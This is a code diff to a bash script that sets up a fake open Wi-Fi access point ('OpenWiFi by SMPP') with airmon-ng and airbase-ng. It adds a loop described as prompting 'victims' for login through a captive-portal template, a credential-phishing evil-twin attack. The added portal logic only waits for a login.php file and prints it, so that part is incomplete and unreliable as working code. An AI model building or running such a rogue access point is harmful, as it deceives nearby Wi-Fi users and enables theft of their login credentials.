@@ -81,8 +81,19 @@ start_captive_portal() {
     # Set interface to monitor mode
     airmon-ng start $interface
     # Start fake AP
-    airbase-ng -a AA:BB:CC:DD:EE:FF -e "OpenWiFi by SMPP" -c 6 $interface
-    # Implement captive portal logic here, using $template variable
+    airbase-ng -a AA:BB:CC:DD:EE:FF -e "OpenWiFi by SMPP" -c 6 $interface &
+    sleep 5 # Wait for fake AP to start
+
+    # Implement captive portal logic
+    echo "Waiting for victims to connect..."
+    # Use template to prompt for login
+    while true; do
+        if [ -e "/var/www/html/login.php" ]; then
+            cat "/var/www/html/login.php"
+            break
+        fi
+        sleep 2
+    done
 }
 
 # Main script starts here
